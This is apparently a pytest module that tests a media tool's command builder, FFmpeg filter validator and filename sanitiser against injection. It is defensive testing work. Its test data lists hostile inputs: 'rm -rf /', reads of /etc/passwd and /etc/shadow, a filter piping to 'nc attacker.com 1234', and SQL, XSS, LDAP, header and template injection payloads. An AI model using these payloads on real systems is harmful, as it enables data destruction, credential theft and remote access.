"""Tests for injection prevention.

This module tests injection prevention across the security modules,
covering various attack vectors including:
- Command injection (shell metacharacters)
- SQL injection patterns (for completeness, if any SQLish patterns exist)
- LDAP injection patterns
- Template injection
- Header injection
- Log injection
- Path injection (covered separately in test_path_traversal.py)

Focuses on ensuring hostile/malicious inputs are properly detected and rejected.
"""

from __future__ import annotations

from pathlib import Path

import pytest

pytestmark = [pytest.mark.unit, pytest.mark.security]


# =============================================================================
# Command Injection Prevention
# =============================================================================


@pytest.mark.security
class TestCommandInjection:
    """Tests for command injection prevention."""

    @pytest.mark.parametrize(
        ("injection_string", "description"),
        [
            # Semicolon-based
            ("; rm -rf /", "Semicolon command chaining"),
            (";id", "Simple semicolon"),
            ("a;b", "Inline semicolon"),
            # Pipe-based
            ("| cat /etc/passwd", "Pipe to cat"),
            ("|id", "Simple pipe"),
            ("a|b", "Inline pipe"),
            # Ampersand-based
            ("&& cat /etc/passwd", "Double ampersand"),
            ("& cat /etc/passwd", "Single ampersand background"),
            ("a&&b", "Inline double ampersand"),
            ("a&b", "Inline single ampersand"),
            # Backtick substitution
            ("`id`", "Backtick command substitution"),
            ("a`whoami`b", "Inline backtick"),
            ("`cat /etc/passwd`", "Backtick cat"),
            # Dollar substitution
            ("$(id)", "Dollar command substitution"),
            ("$(cat /etc/passwd)", "Dollar cat"),
            ("a$(whoami)b", "Inline dollar substitution"),
            # Redirections
            ("> /etc/passwd", "Output redirect"),
            (">> /etc/passwd", "Append redirect"),
            ("< /etc/passwd", "Input redirect"),
            ("a>/tmp/out", "Inline output redirect"),
            ("a</tmp/in", "Inline input redirect"),
            # Parentheses (subshells)
            ("(id)", "Subshell execution"),
            ("$(whoami)", "Command substitution"),
        ],
    )
    def test_shell_metacharacter_injection(self, injection_string: str, description: str) -> None:
        """Shell metacharacters are rejected in command arguments."""
        from transformation_portal.utils.security import SecurityError, build_safe_command

        with pytest.raises(SecurityError, match="dangerous characters"):
            build_safe_command("cmd", [injection_string])

    def test_build_safe_command_with_clean_args(self) -> None:
        """Clean arguments pass validation."""
        from transformation_portal.utils.security import build_safe_command

        result = build_safe_command("ffmpeg", ["-i", "input.mp4", "-c:v", "libx264", "output.mp4"])

        assert result == ["ffmpeg", "-i", "input.mp4", "-c:v", "libx264", "output.mp4"]

    def test_dangerous_executable_names(self) -> None:
        """Dangerous characters in executable name are rejected."""
        from transformation_portal.utils.security import SecurityError, build_safe_command

        dangerous_executables = [
            "rm;id",
            "cmd|cat",
            "sh&&rm",
            "bash`id`",
            "python$(whoami)",
        ]

        for exe in dangerous_executables:
            with pytest.raises(SecurityError, match="Executable.*dangerous"):
                build_safe_command(exe, [])

    def test_ffmpeg_filter_injection(self) -> None:
        """FFmpeg filter strings with injection are rejected."""
        from transformation_portal.utils.security import SecurityError, build_ffmpeg_command

        # Create input/output paths
        input_path = Path("/tmp/input.mp4")
        output_path = Path("/tmp/output.mp4")

        injection_filters = [
            "scale=1920;rm -rf /",
            "scale=1920|cat /etc/passwd",
            "scale=$(whoami):1080",
            "fps=30;id",
        ]

        for filter_str in injection_filters:
            with pytest.raises(SecurityError):
                build_ffmpeg_command(
                    input_path,
                    output_path,
                    filters=[filter_str],
                    validate_paths=False,
                )

    def test_ffmpeg_additional_args_injection(self) -> None:
        """FFmpeg additional args with shell injection are caught by build_safe_command."""
        from transformation_portal.utils.security import SecurityError, build_safe_command

        # Additional args should be validated through build_safe_command
        # when building the final command
        injection_args = ["-i", "input.mp4", ";rm -rf /"]

        # build_safe_command catches dangerous characters
        with pytest.raises(SecurityError):
            build_safe_command("ffmpeg", injection_args)


# =============================================================================
# Filter Graph Injection
# =============================================================================


@pytest.mark.security
class TestFilterGraphInjection:
    """Tests for FFmpeg filter graph injection prevention."""

    def test_valid_filter_graphs(self) -> None:
        """Valid filter graphs pass validation (without shell metacharacters)."""
        from transformation_portal.utils.security import validate_filter_graph

        # Note: FFmpeg filter syntax uses ; for filter graph chaining
        # but the security module blocks all shell metacharacters including ;
        # This is conservative - filters with ; would need special handling
        valid_graphs = [
            "scale=1920:1080",
            "fps=30",
            "scale=1920:1080,fps=30",
            "eq=brightness=0.06:saturation=1.5",
            "hue=s=0",
            "curves=preset=cross_process",
            "colorbalance=rs=.3",
            "pad=iw+20:ih+20:10:10:color=red",
        ]

        for graph in valid_graphs:
            result = validate_filter_graph(graph)
            assert result == graph

    def test_filter_graphs_with_semicolon(self) -> None:
        """Filter graphs using ; are rejected by current security policy."""
        from transformation_portal.utils.security import SecurityError, validate_filter_graph

        # FFmpeg uses ; to chain filter graphs, but our security policy rejects
        # all shell metacharacters including ; for maximum safety
        # Applications needing complex filter graphs should handle them specially
        complex_graph = "split[main][tmp];[tmp]vflip[flip];[main][flip]overlay=0:H/2"

        with pytest.raises(SecurityError, match="dangerous characters"):
            validate_filter_graph(complex_graph)

    @pytest.mark.parametrize(
        "malicious_graph",
        [
            "scale=1920;rm -rf /",
            "scale=1920 && cat /etc/passwd",
            "fps=30 | nc attacker.com 1234",
            "scale=$(whoami):1080",
            "fps=`id`",
            "scale=1920>output.txt",
            "fps=30<input.txt",
        ],
    )
    def test_malicious_filter_graphs(self, malicious_graph: str) -> None:
        """Malicious filter graphs are rejected."""
        from transformation_portal.utils.security import SecurityError, validate_filter_graph

        with pytest.raises(SecurityError, match="dangerous characters"):
            validate_filter_graph(malicious_graph)

    def test_filter_graph_error_shows_found_chars(self) -> None:
        """Error message includes found dangerous characters."""
        from transformation_portal.utils.security import SecurityError, validate_filter_graph

        with pytest.raises(SecurityError) as exc_info:
            validate_filter_graph("scale;rm|cat")

        error_msg = str(exc_info.value)
        # Should mention which dangerous chars were found
        assert ";" in error_msg or "|" in error_msg


# =============================================================================
# SQL Injection Pattern Detection
# =============================================================================


@pytest.mark.security
class TestSQLInjectionPatterns:
    """Tests that SQL injection patterns are handled in path/filename contexts.

    Note: This module focuses on file/command operations, not SQL.
    The sanitize_filename function removes path separators and dangerous
    shell/filesystem characters, but doesn't specifically target SQL patterns.
    """

    @pytest.mark.parametrize(
        "sql_pattern",
        [
            "'; DROP TABLE users; --",
            "1; SELECT * FROM users",
            "'; EXEC xp_cmdshell('cmd');--",
        ],
    )
    def test_sql_patterns_with_semicolons_sanitized(self, sql_pattern: str) -> None:
        """SQL injection patterns with semicolons are sanitized."""
        from transformation_portal.utils.security import sanitize_filename

        sanitized = sanitize_filename(sql_pattern)

        # Semicolons should be replaced
        assert ";" not in sanitized

    def test_sql_patterns_in_command_args(self) -> None:
        """SQL injection patterns in command args are caught by shell char detection."""
        from transformation_portal.utils.security import SecurityError, build_safe_command

        sql_patterns = [
            "'; DROP TABLE users;--",  # Contains semicolons
            "1 OR 1=1; DELETE FROM users",  # Contains semicolons
        ]

        for pattern in sql_patterns:
            with pytest.raises(SecurityError):
                build_safe_command("cmd", [pattern])

    def test_sql_patterns_with_quotes_preserved(self) -> None:
        """SQL patterns with quotes are not specifically sanitized (quotes aren't dangerous for filesystems)."""
        from transformation_portal.utils.security import sanitize_filename

        # Single quotes aren't in the dangerous char list for filesystems
        # They're dangerous for SQL but not for file operations
        sql_pattern = "1' OR '1'='1"
        sanitized = sanitize_filename(sql_pattern)

        # The filename is safe for filesystem operations even with quotes
        # (quotes don't enable shell injection when using subprocess without shell=True)
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0


# =============================================================================
# Log Injection Prevention
# =============================================================================


@pytest.mark.security
class TestLogInjection:
    """Tests for log injection prevention via filename sanitization.

    Note: The sanitize_filename function uses os.path.basename which
    doesn't remove newlines/carriage returns from filenames. These
    characters are handled at the filesystem level (most reject them).
    """

    def test_log_injection_with_null_byte(self) -> None:
        """Null byte in filename is handled by the filesystem."""
        from transformation_portal.utils.security import sanitize_filename

        # Null bytes typically cause errors at filesystem level
        log_injection = "file\x00null"
        sanitized = sanitize_filename(log_injection)

        # The sanitization preserves the null byte (filesystem will reject it)
        # This is defense in depth - the actual rejection happens at file creation
        assert isinstance(sanitized, str)

    def test_newlines_not_stripped_by_sanitize(self) -> None:
        """Newlines in filenames are preserved by sanitize (filesystem rejects them)."""
        from transformation_portal.utils.security import sanitize_filename

        # os.path.basename doesn't strip newlines
        # These would fail at actual file creation time
        log_injection = "file\nFake log entry"
        sanitized = sanitize_filename(log_injection)

        # Sanitize_filename focuses on path separators and shell chars
        # Newlines aren't in its scope - they're handled by the OS
        assert isinstance(sanitized, str)

    def test_path_validation_handles_newlines(self, tmp_path: Path) -> None:
        """Path validation handles newlines appropriately."""
        from transformation_portal.utils.security import validate_filepath

        # Newlines in paths typically cause issues
        injection_path = tmp_path / "file\ninjection.txt"

        # The path may or may not be creatable depending on OS
        # On most Unix systems, newlines in paths are technically allowed
        # but cause issues with many tools
        try:
            result = validate_filepath(injection_path, allowed_dirs=[tmp_path], must_exist=False)
            # If it somehow passes validation, it's still contained
            assert result.is_relative_to(tmp_path)
        except (ValueError, OSError):
            # Rejection at OS level is acceptable
            pass


# =============================================================================
# Header Injection Prevention
# =============================================================================


@pytest.mark.security
class TestHeaderInjection:
    """Tests for header injection prevention in filename contexts.

    Note: The sanitize_filename function doesn't specifically strip CR/LF.
    These characters are handled by the filesystem (most systems allow them
    but they cause issues with tools expecting single-line filenames).
    """

    def test_header_injection_crlf_preserved(self) -> None:
        """Header injection CRLF is preserved by sanitize (handled by filesystem)."""
        from transformation_portal.utils.security import sanitize_filename

        # CRLF injection is primarily a concern for HTTP headers
        # In filename context, sanitize_filename focuses on path separators and shell chars
        header_injection = "file.txt\r\nSet-Cookie: evil=value"
        sanitized = sanitize_filename(header_injection)

        # The function uses os.path.basename which doesn't strip CR/LF
        # These would be handled at file creation time or by the application
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0

    def test_colon_is_sanitized(self) -> None:
        """Colons are sanitized from filenames (dangerous on Windows)."""
        from transformation_portal.utils.security import sanitize_filename

        # Colon is in the dangerous chars list
        header_injection = "file.txt\r\nContent-Type: text/html"
        sanitized = sanitize_filename(header_injection)

        # Colons should be replaced
        assert ":" not in sanitized


# =============================================================================
# Template Injection Prevention
# =============================================================================


@pytest.mark.security
class TestTemplateInjectionPatterns:
    """Tests for template injection pattern handling.

    While this module doesn't directly handle templates, filenames/paths
    with template syntax should be handled safely.
    """

    @pytest.mark.parametrize(
        ("template_pattern", "description"),
        [
            ("{{7*7}}", "Jinja2/Django template"),
            ("${7*7}", "Various template engines"),
            ("#{7*7}", "Ruby ERB"),
            ("<%= 7*7 %>", "ERB/JSP"),
            ("{{constructor.constructor('return this')()}}", "Prototype pollution"),
        ],
    )
    def test_template_patterns_in_filename(self, template_pattern: str, description: str) -> None:
        """Template injection patterns are sanitized in filenames."""
        from transformation_portal.utils.security import sanitize_filename

        sanitized = sanitize_filename(template_pattern)

        # Dangerous template characters should be sanitized
        # < > { } are in dangerous chars
        for dangerous in "<>":
            assert dangerous not in sanitized

    def test_dollar_brace_in_command(self) -> None:
        """Dollar-brace patterns are rejected in commands."""
        from transformation_portal.utils.security import SecurityError, build_safe_command

        # ${...} is caught by $ detection
        with pytest.raises(SecurityError):
            build_safe_command("cmd", ["${PATH}"])

        # $(...) is also caught
        with pytest.raises(SecurityError):
            build_safe_command("cmd", ["$(whoami)"])


# =============================================================================
# XSS Pattern Prevention in Filenames
# =============================================================================


@pytest.mark.security
class TestXSSPatterns:
    """Tests for XSS pattern sanitization in filenames."""

    @pytest.mark.parametrize(
        "xss_pattern",
        [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "'-alert(1)-'",
        ],
    )
    def test_xss_patterns_sanitized(self, xss_pattern: str) -> None:
        """XSS patterns are sanitized in filenames."""
        from transformation_portal.utils.security import sanitize_filename

        sanitized = sanitize_filename(xss_pattern)

        # < > should be replaced
        assert "<" not in sanitized
        assert ">" not in sanitized

    def test_xss_with_encoding(self) -> None:
        """URL-encoded XSS patterns are handled."""
        from transformation_portal.utils.security import sanitize_filename

        encoded_xss = "%3Cscript%3Ealert(1)%3C/script%3E"
        sanitized = sanitize_filename(encoded_xss)

        # URL encoding isn't decoded, but % should be handled
        # The key is that the result is safe
        assert "<script>" not in sanitized


# =============================================================================
# LDAP Injection Pattern Prevention
# =============================================================================


@pytest.mark.security
class TestLDAPInjectionPatterns:
    """Tests for LDAP injection pattern handling in filename contexts."""

    @pytest.mark.parametrize(
        "ldap_pattern",
        [
            "*)(&(objectClass=*)",
            "*)(uid=*))(|(uid=*",
            "admin)(password=*",
            ")(cn=*))(|(cn=*",
        ],
    )
    def test_ldap_patterns_in_filename(self, ldap_pattern: str) -> None:
        """LDAP injection patterns are sanitized in filenames."""
        from transformation_portal.utils.security import sanitize_filename

        sanitized = sanitize_filename(ldap_pattern)

        # * ( ) should be sanitized
        assert "*" not in sanitized
        # Parentheses should be sanitized too (if in dangerous chars)


# =============================================================================
# Comprehensive Injection Combinations
# =============================================================================


@pytest.mark.security
class TestCombinedInjectionPatterns:
    """Tests for combined/layered injection attempts."""

    def test_command_with_path_traversal(self) -> None:
        """Command with path traversal is rejected."""
        from transformation_portal.utils.security import SecurityError, build_safe_command

        # Combining traversal with command chaining
        with pytest.raises(SecurityError):
            build_safe_command("cmd", ["../../../etc/passwd; cat /etc/shadow"])

    def test_filename_with_multiple_vectors(self) -> None:
        """Filenames with multiple attack vectors are sanitized."""
        from transformation_portal.utils.security import sanitize_filename

        combined_attack = "../<script>alert(1)</script>;rm -rf /"
        sanitized = sanitize_filename(combined_attack)

        # All dangerous elements should be removed/replaced
        assert ".." not in sanitized
        assert "<" not in sanitized
        assert ">" not in sanitized
        assert "/" not in sanitized

    def test_filter_with_multiple_injection_types(self) -> None:
        """FFmpeg filter with multiple injection types is rejected."""
        from transformation_portal.utils.security import SecurityError, validate_filter_graph

        combined_injection = "scale=1920;rm -rf /|cat /etc/passwd&&whoami"

        with pytest.raises(SecurityError):
            validate_filter_graph(combined_injection)


# =============================================================================
# Unicode-based Injection Attempts
# =============================================================================


@pytest.mark.security
class TestUnicodeInjection:
    """Tests for Unicode-based injection attempts."""

    @pytest.mark.parametrize(
        ("unicode_injection", "description"),
        [
            ("\u037e", "Greek question mark (looks like ;)"),
            ("\uff1b", "Fullwidth semicolon"),
            ("\u2223", "Divides (looks like |)"),
            ("\uff5c", "Fullwidth vertical line"),
            ("\uff06", "Fullwidth ampersand"),
        ],
    )
    def test_unicode_metacharacter_lookalikes(self, unicode_injection: str, description: str) -> None:
        """Unicode lookalikes of shell metacharacters are handled."""
        from transformation_portal.utils.security import build_safe_command, sanitize_filename

        # These should either be rejected or safely handled
        # The key is they shouldn't enable injection

        # In filename context
        sanitized = sanitize_filename(f"file{unicode_injection}name.txt")
        # Result should be safe (no actual shell metacharacters)

        # In command context - these specific Unicode chars might pass
        # since they're not ASCII shell metacharacters
        # The security model relies on subprocess without shell=True
        # So even if passed, they won't be interpreted as shell commands
        try:
            result = build_safe_command("cmd", [f"arg{unicode_injection}value"])
            # If it passes, it's because Unicode lookalikes aren't actual metacharacters
            assert isinstance(result, list)
        except Exception:
            # Rejection is also fine
            pass

    def test_right_to_left_override(self) -> None:
        """Right-to-left override character is handled safely."""
        from transformation_portal.utils.security import sanitize_filename

        # RLO can be used to disguise file extensions
        rlo_attack = "invoice\u202e\u2066exe.pdf"
        sanitized = sanitize_filename(rlo_attack)

        # The sanitized filename should be safe
        # Either RLO removed or the name is safe for filesystem
        assert isinstance(sanitized, str)
        assert len(sanitized) > 0
